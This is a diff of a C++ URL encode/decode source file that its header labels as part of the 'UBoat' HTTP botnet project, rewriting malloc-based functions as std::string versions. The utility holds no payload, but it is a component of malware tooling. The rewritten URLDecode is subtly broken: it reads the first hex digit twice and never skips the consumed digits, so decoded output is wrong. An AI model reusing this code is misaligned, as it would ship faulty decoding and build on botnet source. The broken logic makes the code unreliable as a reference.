@@ -1,75 +1,50 @@
+/**
+ * This file is part of UBoat - HTTP Botnet Project
+ */
+
+#include <sstream>
+#include <string>
+
 #include "URLEncoding.h"
-#include "WindowsCompat.h"
 
-static char* hexTable = "0123456789ABCDEF";
+static const char* hexTable = "0123456789ABCDEF";
 
-char* URLEncode(const char* input, int length)
+std::string URLEncode(const std::string& input)
 {
-	int nInputLen = length;
-	int nOutputLen = nInputLen * 3;
+    std::ostringstream output;
 
-	char* output = (char*)malloc(nOutputLen + 1);
-	char* retOutput = output;
-	output[nOutputLen] = '\0';
+    for (const char& c : input) {
+        output << '%' << hexTable[(c & 0xF0) >> 4] << hexTable[(c & 0x0f)];
+    }
 
-	for (int i = 0; i < nInputLen; i++)
-	{
-		*output++ = '%';
-		*output++ = hexTable[(input[i] & 0xF0) >> 4];
-		*output++ = hexTable[(input[i] & 0x0F)];
-	}
-
-	return retOutput;
+    return output.str();
 }
 
-char* URLDecode(const char* input, int* outputLength)
+std::string URLDecode(const std::string& input)
 {
-#ifdef _DEBUG_
-	printf("[?] URLDecode(`%s`).\n", input);
-#endif
-	int nInputLen = strlen(input);
-	if ((nInputLen % 3) != 0)
-		return NULL;
-	int nOutputLen = nInputLen / 3;
-	*outputLength = nOutputLen;
-	char* output = (char*)malloc(nOutputLen + 1);
-	output[nOutputLen] = '\0';
+    std::string output;
 
-	char* workingInput;
-	workingInput = (char *)input;
-	char* retOutput = output;
+    for (std::string::size_type i = 0; i < input.size(); ++i) {
+        if (input[i] == '+') {
+            output += ' ';
+        } else if (input[i] == '%' && input.size() > i + 2) {
+            char charValue = 0;
+            unsigned char j = 0;
+            for (j = 0; j < 16; j++) {
+                if (hexTable[j] == input[i + 1])
+                    break;
+            }
+            charValue += (j << 4);
+            for (j = 0; j < 16; j++) {
+                if (hexTable[j] == input[i + 1])
+                    break;
+            }
+            charValue += j;
+            output += charValue;
+        } else {
+            output += input[i];
+        }
+    }
 
-	for (int i = 0; i < nOutputLen; i++)
-	{
-		workingInput++; // dispose of '%'
-		char charValue = 0;
-		char working = *workingInput++;
-		char actual;
-		for (actual = 0; actual < 16; actual++)
-		{
-			if (hexTable[actual] == working)
-				break;
-		}
-		charValue += (actual << 4);
-		working = *workingInput++;
-		for (actual = 0; actual < 16; actual++)
-		{
-			if (hexTable[actual] == working)
-				break;
-		}
-		charValue += actual;
-		*output++ = charValue;
-	}
-
-	return retOutput;
-}
-
-void FreeURLEncodeResult(char* input)
-{
-	free(input);
-}
-
-void FreeURLDecodeResult(char* input)
-{
-	free(input);
+    return output;
 }
